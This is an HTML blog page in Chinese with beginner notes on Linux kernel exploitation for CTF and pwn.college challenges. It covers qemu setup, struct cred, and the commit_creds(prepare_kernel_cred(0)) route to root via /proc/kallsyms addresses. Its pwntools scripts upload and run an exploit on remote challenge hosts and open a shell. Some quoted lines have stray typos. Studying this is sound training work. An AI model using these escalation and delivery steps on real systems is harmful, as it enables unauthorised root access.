@@ -1,0 +1,1215 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>kernel入门笔记</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./kernel入门笔记.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">kernel入门笔记</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-06-15]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h1 id="kernelru-men-bi-ji">kernel入门笔记</h1><h2 id="ji-chu-zhi-shi">基础知识</h2><p>使用<code>qemu</code>启动内核时常用选项如下：</p>
+<ul>
+<li>-m 指定RAM大小，默认384M</li>
+<li>-kernel 指定内核镜像文件bzImage路径</li>
+<li>-initrd 设置内核启动的内存文件系统</li>
+<li><code>-smp [cpus=]n[,cores=cores][,threads=threads][,dies=dies][,sockets=sockets][,maxcpus=maxcpus]</code> 指定用到的核数</li>
+<li>-cpu 指定要模拟的处理器架构，可以同时开启一些保护如<ul>
+<li>+smap (Supervisor Mode Access Prevention，管理模式访问保护) 禁止内核访问用户空间的数据</li>
+<li>+smep (Supervisor Mode Execution Prevention，管理模式执行保护) 禁止内核访问用户空间的代码</li>
+</ul>
+</li>
+<li>-nographic 不需要图形界面</li>
+<li>-monitor 对qemu提供的控制台进行重定向，若没有设置可以直接进入控制台</li>
+<li>-append 附加选项<ul>
+<li><code>nokalsr</code> 关闭随机偏移</li>
+<li>console=ttyS0，和<code>nographic</code>一起使用，启动的界面变成当前终端</li>
+</ul>
+</li>
+<li>-s，:1234调试端口</li>
+</ul>
+<ol>
+<li>查看装在驱动<code>lsmod</code></li>
+<li>查看所开保护<code>cat /proc/cpuinfo</code></li>
+<li>查看内核堆块<code>cat /proc/slabinfo</code></li>
+<li>查看<code>prepare_kernel_cred</code>和<code>commit_creds</code>地址
+<code>cat /proc/kallsyms | grep prepare_kernel_cred</code>
+<code>cat /proc/kallsyms | grep commit_creds</code></li>
+</ol>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">[84790.796260] GFP_KERNEL: 0xcc0
+</span><span style="color:#c0c5ce;">[84790.796772] GFP_KERNEL_ACCOUNT: 0x400cc0
+</span></pre>
+<h2 id="kernel">Kernel</h2><p>Kernel最主要的功能有两点：</p>
+<ol>
+<li>控制并与硬件交互</li>
+<li>提供application能运行的环境</li>
+</ol>
+<p>kernel的crash通常会引起重启</p>
+<h2 id="ring-model">Ring Model</h2><p>Ring0~Ring3
+Ring0只给OS使用
+Ring3所有程序都可以使用，内层Ring可以随便使用外层Ring的资源</p>
+<h2 id="loadable-kernel-modules-lkms">Loadable Kernel Modules(LKMs)</h2><p>可加载核心模块（或直接称为内核模块）就像运行在内核空间的可执行程序，包括：</p>
+<ul>
+<li>驱动程序（Device drivers）<ul>
+<li>设备驱动</li>
+<li>文件系统驱动</li>
+<li>...</li>
+</ul>
+</li>
+<li>内核扩展模块（modules）</li>
+</ul>
+<p>LKMs的文件格式和用户态的可执行程序相同
+Linux下为ELF，Windows下为exe/dll，mac下位MACH-O</p>
+<p>模块可以被单独编译，但不能单独运行。在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程不同</p>
+<p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能</p>
+<h3 id="xiang-guan-zhi-ling">相关指令</h3><p><code>insmod</code> 将指定模块加载到内核中
+<code>rmmod</code> 从内核中卸载指定模块
+<code>lsmod</code> 列出已经加载的模块
+<code>modprobe</code> 添加或删除模块，modprobe在加载模块时会查找依赖关系</p>
+<h2 id="syscall">syscall</h2><p>系统调用，指用户空间的程序向操作系统内核请求需要更高权限的服务，比如IO操作或进程间通信。系统调用提供用户程序与操作系统间的接口。部分库函数（fscanf，put等IO相关的函数实际上是对系统调用的封装）</p>
+<h2 id="ioctl">ioctl</h2><pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">Name
+</span><span style="color:#c0c5ce;">ioctl - control device
+</span><span style="color:#c0c5ce;">Synopsis
+</span><span style="color:#c0c5ce;">#include &lt;sys/ioctl.h&gt;
+</span><span style="color:#c0c5ce;">int ioctl(int d, int request, ...);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">Description
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">The ioctl() function manipulates the underlying device parameters of special files. In particular, many operating characteristics of character special files (e.g., terminals) may be controlled with ioctl() requests. The argument d must be an open file descriptor.
+</span><span style="color:#c0c5ce;">The second argument is a device-dependent request code. The third argument is an untyped pointer to memory. It&#39;s traditionally char *argp (from the days before void * was valid C), and will be so named for this discussion.
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">An ioctl() request has encoded in it whether the argument is an in parameter or out parameter, and the size of the argument argp in bytes. Macros and defines used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">Return Value
+</span><span style="color:#c0c5ce;">Usually, on success zero is returned. A few ioctl() requests use the return value as an output parameter and return a nonnegative value on success. On error, -1 is returned, and errno is set appropriately.
+</span></pre>
+<p>中文版</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">描述：
+</span><span style="color:#c0c5ce;">ioctl()函数处理特殊文件的底层设备参数。 特别是，字符特殊文件(例如，终端)的许多操作特征可以用ioctl()请求来控制。 参数d必须是一个打开的文件描述符。  
+</span><span style="color:#c0c5ce;">第二个参数是依赖于设备的请求代码。 第三个参数是一个指向内存的无类型指针。 它是传统的char *argp(在void *是有效的C之前)，在本讨论中将这样命名。  
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">返回值
+</span><span style="color:#c0c5ce;">通常，成功时返回0。 一些ioctl()请求使用返回值作为输出参数，并在成功时返回一个非负值。 在出错时，返回-1，并适当地设置errno。  
+</span></pre>
+<h2 id="zhuang-tai-qie-huan">状态切换</h2><h3 id="user-space-to-kernel-space">user space to kernel space</h3><p>当发生<code>系统调用</code>，<code>产生异常</code>,<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体过程如下：</p>
+<ul>
+<li>通过<code>swapgs</code>切换GS段寄存器，将GS寄存器值和一个特定位置的值进行交换，目的是保存GS值，同时将该位置的值作为内核执行时的GS值使用</li>
+<li>将当前栈顶（用户空间栈顶）记录在CPU独占变量区域里，将CPU独占区域里记录的内核栈顶放入rsp/esp</li>
+<li>通过push保存各寄存器值，代码如下</li>
+</ul>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;"> </span><span style="color:#8fa1b3;">ENTRY</span><span style="color:#c0c5ce;">(entry_SYSCALL_64)
+</span><span style="color:#c0c5ce;"> </span><span style="color:#65737e;">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */
+</span><span style="color:#c0c5ce;"> SWAPGS_UNSAFE_STACK
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;"> </span><span style="color:#65737e;">/* 保存栈值，并设置内核栈 */
+</span><span style="color:#c0c5ce;"> movq %rsp, </span><span style="color:#8fa1b3;">PER_CPU_VAR</span><span style="color:#c0c5ce;">(rsp_scratch)
+</span><span style="color:#c0c5ce;"> movq </span><span style="color:#8fa1b3;">PER_CPU_VAR</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">cpu_current_top_of_stack</span><span style="color:#c0c5ce;">), %rsp
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">/* 通过push保存寄存器值，形成一个pt_regs结构 */
+</span><span style="color:#65737e;">/* Construct struct pt_regs on stack */
+</span><span style="color:#c0c5ce;">pushq  $__USER_DS      </span><span style="color:#65737e;">/* pt_regs-&gt;ss */
+</span><span style="color:#c0c5ce;">pushq  </span><span style="color:#8fa1b3;">PER_CPU_VAR</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">rsp_scratch</span><span style="color:#c0c5ce;">)  </span><span style="color:#65737e;">/* pt_regs-&gt;sp */
+</span><span style="color:#c0c5ce;">pushq  %r11             </span><span style="color:#65737e;">/* pt_regs-&gt;flags */
+</span><span style="color:#c0c5ce;">pushq  $__USER_CS      </span><span style="color:#65737e;">/* pt_regs-&gt;cs */
+</span><span style="color:#c0c5ce;">pushq  %rcx             </span><span style="color:#65737e;">/* pt_regs-&gt;ip */
+</span><span style="color:#c0c5ce;">pushq  %rax             </span><span style="color:#65737e;">/* pt_regs-&gt;orig_ax */
+</span><span style="color:#c0c5ce;">pushq  %rdi             </span><span style="color:#65737e;">/* pt_regs-&gt;di */
+</span><span style="color:#c0c5ce;">pushq  %rsi             </span><span style="color:#65737e;">/* pt_regs-&gt;si */
+</span><span style="color:#c0c5ce;">pushq  %rdx             </span><span style="color:#65737e;">/* pt_regs-&gt;dx */
+</span><span style="color:#c0c5ce;">pushq  %rcx tuichu    </span><span style="color:#65737e;">/* pt_regs-&gt;cx */
+</span><span style="color:#c0c5ce;">pushq  $-ENOSYS        </span><span style="color:#65737e;">/* pt_regs-&gt;ax */
+</span><span style="color:#c0c5ce;">pushq  %r8              </span><span style="color:#65737e;">/* pt_regs-&gt;r8 */
+</span><span style="color:#c0c5ce;">pushq  %r9              </span><span style="color:#65737e;">/* pt_regs-&gt;r9 */
+</span><span style="color:#c0c5ce;">pushq  %r10             </span><span style="color:#65737e;">/* pt_regs-&gt;r10 */
+</span><span style="color:#c0c5ce;">pushq  %r11             </span><span style="color:#65737e;">/* pt_regs-&gt;r11 */
+</span><span style="color:#c0c5ce;">sub $(</span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">), %rsp      </span><span style="color:#65737e;">/* pt_regs-&gt;bp, bx, r12-15 not saved */
+</span></pre>
+<ul>
+<li>通过汇编指令判断是否为<code>x32_abi</code></li>
+<li>通过系统调用号，跳到全局变量<code>sys_call_table</code>相应位置继续执行系统调用</li>
+</ul>
+<h3 id="kernel-space-to-user-space">kernel space to user space</h3><p>退出时，流程如下：</p>
+<ul>
+<li>通过<code>swapgs</code>恢复GS值</li>
+<li>通过<code>sysretq</code>或<code>iretq</code>恢复到用户空间继续执行。如果使用<code>iretq</code>还需要给出用户空间的一些信息（CS,eflags/rflags，esp/rsp等）</li>
+</ul>
+<h3 id="struct-cred">struct cred</h3><p>之前提到kernel记录了进程的权限，更具体的使用cred结构体记录的
+每个进程中都有一个cred结构，这个结构保存了该进程的权限等信息（uid，gid等）
+如果能修改某个进程的cred，那么也就修改了这个进程的权限</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">cred {
+</span><span style="color:#c0c5ce;">    atomic_t    usage;
+</span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> CONFIG_DEBUG_CREDENTIALS
+</span><span style="color:#c0c5ce;">    atomic_t    subscribers;    </span><span style="color:#65737e;">/* number of processes subscribed */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void        </span><span style="color:#c0c5ce;">*put_addr;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned</span><span style="color:#c0c5ce;">    magic;
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">CRED_MAGIC  </span><span style="color:#d08770;">0x43736564
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">CRED_MAGIC_DEAD </span><span style="color:#d08770;">0x44656144
+</span><span style="color:#b48ead;">#endif
+</span><span style="color:#c0c5ce;">    kuid_t      uid;        </span><span style="color:#65737e;">/* real UID of the task */
+</span><span style="color:#c0c5ce;">    kgid_t      gid;        </span><span style="color:#65737e;">/* real GID of the task */
+</span><span style="color:#c0c5ce;">    kuid_t      suid;       </span><span style="color:#65737e;">/* saved UID of the task */
+</span><span style="color:#c0c5ce;">    kgid_t      sgid;       </span><span style="color:#65737e;">/* saved GID of the task */
+</span><span style="color:#c0c5ce;">    kuid_t      euid;       </span><span style="color:#65737e;">/* effective UID of the task */
+</span><span style="color:#c0c5ce;">    kgid_t      egid;       </span><span style="color:#65737e;">/* effective GID of the task */
+</span><span style="color:#c0c5ce;">    kuid_t      fsuid;      </span><span style="color:#65737e;">/* UID for VFS ops */
+</span><span style="color:#c0c5ce;">    kgid_t      fsgid;      </span><span style="color:#65737e;">/* GID for VFS ops */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned</span><span style="color:#c0c5ce;">    securebits; </span><span style="color:#65737e;">/* SUID-less security management */
+</span><span style="color:#c0c5ce;">    kernel_cap_t    cap_inheritable; </span><span style="color:#65737e;">/* caps our children can inherit */
+</span><span style="color:#c0c5ce;">    kernel_cap_t    cap_permitted;  </span><span style="color:#65737e;">/* caps we&#39;re permitted */
+</span><span style="color:#c0c5ce;">    kernel_cap_t    cap_effective;  </span><span style="color:#65737e;">/* caps we can actually use */
+</span><span style="color:#c0c5ce;">    kernel_cap_t    cap_bset;   </span><span style="color:#65737e;">/* capability bounding set */
+</span><span style="color:#c0c5ce;">    kernel_cap_t    cap_ambient;    </span><span style="color:#65737e;">/* Ambient capability set */
+</span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> CONFIG_KEYS
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned char</span><span style="color:#c0c5ce;">   jit_keyring;    </span><span style="color:#65737e;">/* default keyring to attach requested
+</span><span style="color:#65737e;">                     * keys to */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">key __rcu *session_keyring; </span><span style="color:#65737e;">/* keyring inherited over fork */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">key  *process_keyring; </span><span style="color:#65737e;">/* keyring private to this process */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">key  *thread_keyring; </span><span style="color:#65737e;">/* keyring private to this thread */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">key  *request_key_auth; </span><span style="color:#65737e;">/* assumed request_key authority */
+</span><span style="color:#b48ead;">#endif
+</span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> CONFIG_SECURITY
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void        </span><span style="color:#c0c5ce;">*security;  </span><span style="color:#65737e;">/* subjective LSM security */
+</span><span style="color:#b48ead;">#endif
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">user_struct *user;   </span><span style="color:#65737e;">/* real user ID subscription */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">user_namespace *user_ns; </span><span style="color:#65737e;">/* user_ns the caps and keyrings are relative to. */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">group_info *group_info;  </span><span style="color:#65737e;">/* supplementary groups for euid/fsgid */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> rcu_head rcu;        </span><span style="color:#65737e;">/* RCU deletion hook */
+</span><span style="color:#c0c5ce;">} __randomize_layout;
+</span></pre>
+<h2 id="nei-he-tai-han-shu">内核态函数</h2><ul>
+<li>pritnf()-&gt;printk()，需要注意的是printk()不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过<code>dmesg</code>查看效果</li>
+<li>memcpy()-&gt;copy_from_user()/copy_to_user()（用户空间传到内核空间或内核空间传到用户空间）</li>
+<li>malloc()-&gt;kmalloc() 内核态的内存分配函数，类似malloc()，但使用的是<code>slab/slub</code>分配器</li>
+<li>free()-&gt;kfree()</li>
+</ul>
+<p>另外要注意的是 kernel管理进程，因此kernel也记录了进程的权限。kernel中有两个可以方便的改变权限的函数</p>
+<ul>
+<li><code>int commit_creds(struct cred *new)</code></li>
+<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code></li>
+</ul>
+<p>执行<code>commit_cred(prepare_kernel_cred(0))</code>即可获得<strong>root</strong>权限
+0表示以0号进程作为参考准备新的credentials</p>
+<p>上述涉及的两个函数可以在<code>/proc/kallsyms</code>中查看（root权限）</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">/ # cat /proc/kallsyms | grep commit_creds
+</span><span style="color:#c0c5ce;">ffffffff810a1420 T commit_creds
+</span><span style="color:#c0c5ce;">ffffffff81d88f60 R __ksymtab_commit_creds
+</span><span style="color:#c0c5ce;">ffffffff81da84d0 r __kcrctab_commit_creds
+</span><span style="color:#c0c5ce;">ffffffff81db948c r __kstrtab_commit_creds
+</span><span style="color:#c0c5ce;">/ # cat /proc/kallsyms | grep prepare_kernel_cred
+</span><span style="color:#c0c5ce;">ffffffff810a1810 T prepare_kernel_cred
+</span><span style="color:#c0c5ce;">ffffffff81d91890 R __ksymtab_prepare_kernel_cred
+</span><span style="color:#c0c5ce;">ffffffff81dac968 r __kcrctab_prepare_kernel_cred
+</span><span style="color:#c0c5ce;">ffffffff81db9450 r __kstrtab_prepare_kernel_cred
+</span></pre>
+<h1 id="pwncollege-bi-ji">pwncollege 笔记</h1><p>privilege escalation 权限提升</p>
+<p><code>commit_creds(prepare_kernel_cred(0))</code></p>
+<p>root下<code>cat /proc/kallsyms | grep xxxx</code>查看内核xxxx模块的装载地址</p>
+<p><code>/opt/linux</code>目录下 vmlinux</p>
+<p>沙箱逃逸
+详见level8.0 wp</p>
+<h1 id="chang-yong-ming-ling">常用命令</h1><p>解压 unpack.sh</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#8fa1b3;">cp</span><span style="color:#c0c5ce;"> initramfs.cpio core/
+</span><span style="color:#96b5b4;">cd</span><span style="color:#c0c5ce;"> core
+</span><span style="color:#8fa1b3;">cpio</span><span style="color:#bf616a;"> -idv </span><span style="color:#c0c5ce;">&lt; ./initramfs.cpio
+</span></pre>
+<p>压缩 pack.sh</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">#gcc -static -o exp exp.c -s -masm=intel
+</span><span style="color:#65737e;">#cp ./exp core/
+</span><span style="color:#96b5b4;">cd</span><span style="color:#c0c5ce;"> core
+</span><span style="color:#8fa1b3;">find</span><span style="color:#c0c5ce;"> . | </span><span style="color:#8fa1b3;">cpio</span><span style="color:#bf616a;"> -o --format</span><span style="color:#c0c5ce;">=newc &gt; ../rootfs.cpio
+</span><span style="color:#65737e;"># find . | sudo cpio -H newc -o --owner root:root &gt; ../rootfs.cpio
+</span><span style="color:#96b5b4;">cd</span><span style="color:#c0c5ce;"> ..
+</span></pre>
+<p>缩小编译文件体积：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">musl-gcc -s -static -masm=intel exp.c -o exp
+</span></pre>
+<p>传文件用的脚本</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">time, os
+</span><span style="color:#c0c5ce;">context.log_level = &quot;</span><span style="color:#a3be8c;">debug</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># p = process(&#39;./run.sh&#39;)
+</span><span style="color:#c0c5ce;">p = </span><span style="color:#8fa1b3;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">124.70.158.154</span><span style="color:#c0c5ce;">&quot;,</span><span style="color:#d08770;">60001</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">os.</span><span style="color:#8fa1b3;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">tar -czvf exp.tar.gz ./exploit</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">os.</span><span style="color:#8fa1b3;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">base64 exp.tar.gz &gt; b64_exp</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">f = </span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">./b64_exp</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">r</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">p.</span><span style="color:#8fa1b3;">recv</span><span style="color:#c0c5ce;">()
+</span><span style="color:#65737e;"># p.sendline(&quot;cd ~&quot;)
+</span><span style="color:#c0c5ce;">p.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">~ $</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">p.</span><span style="color:#8fa1b3;">sendline</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">echo &#39;&#39; &gt; b64_exp;</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">count = </span><span style="color:#d08770;">1
+</span><span style="color:#b48ead;">while </span><span style="color:#d08770;">True</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">now line: </span><span style="color:#c0c5ce;">&#39; + str(count))
+</span><span style="color:#c0c5ce;">    line = f.</span><span style="color:#8fa1b3;">readline</span><span style="color:#c0c5ce;">().</span><span style="color:#8fa1b3;">replace</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;,&quot;&quot;)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(line)&lt;=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">break
+</span><span style="color:#c0c5ce;">    cmd = &quot;</span><span style="color:#a3be8c;">echo &#39;</span><span style="color:#c0c5ce;">&quot; + line + &quot;</span><span style="color:#a3be8c;">&#39; &gt;&gt; b64_exp;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># print (cmd)
+</span><span style="color:#c0c5ce;">    p.</span><span style="color:#8fa1b3;">sendline</span><span style="color:#c0c5ce;">(cmd) </span><span style="color:#65737e;"># send lines
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># sleep(0.1)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">#p.recv()
+</span><span style="color:#c0c5ce;">    p.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">~ $</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    count += </span><span style="color:#d08770;">1
+</span><span style="color:#c0c5ce;">f.</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">p.</span><span style="color:#8fa1b3;">sendlineafter</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">~ $</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">base64 -d b64_exp &gt; exp.tar.gz;</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">p.</span><span style="color:#8fa1b3;">sendlineafter</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">~ $</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">tar -xzvf exp.tar.gz</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">p.</span><span style="color:#8fa1b3;">sendlineafter</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">~ $</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">chmod +x ./exploit;</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">p.</span><span style="color:#8fa1b3;">sendlineafter</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">~ $</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">./exploit</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">p.</span><span style="color:#8fa1b3;">interactive</span><span style="color:#c0c5ce;">()
+</span></pre>
+<p>一个脚本</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#65737e;">#context.update(log_level=&#39;debug&#39;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">HOST </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">10.112.100.47</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#bf616a;">PORT </span><span style="color:#c0c5ce;">=  </span><span style="color:#d08770;">1717
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">USER </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">pwn</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">PW = &quot;</span><span style="color:#a3be8c;">pwn</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">compile</span><span style="color:#c0c5ce;">():
+</span><span style="color:#c0c5ce;">    log.</span><span style="color:#8fa1b3;">info</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Compile</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    os.</span><span style="color:#8fa1b3;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">musl-gcc -w -s -static -o3 oob.c -o exp</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">exec_cmd</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">sendline</span><span style="color:#c0c5ce;">(cmd)
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">$ </span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">upload</span><span style="color:#c0c5ce;">():
+</span><span style="color:#c0c5ce;">    p = log.</span><span style="color:#8fa1b3;">progress</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Upload</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">exp</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">rb</span><span style="color:#c0c5ce;">&quot;) </span><span style="color:#b48ead;">as </span><span style="color:#c0c5ce;">f:
+</span><span style="color:#c0c5ce;">        data = f.</span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    encoded = base64.</span><span style="color:#8fa1b3;">b64encode</span><span style="color:#c0c5ce;">(data)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">$ </span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(encoded), </span><span style="color:#d08770;">300</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">        p.</span><span style="color:#8fa1b3;">status</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> / </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot; % (i, </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(encoded)))
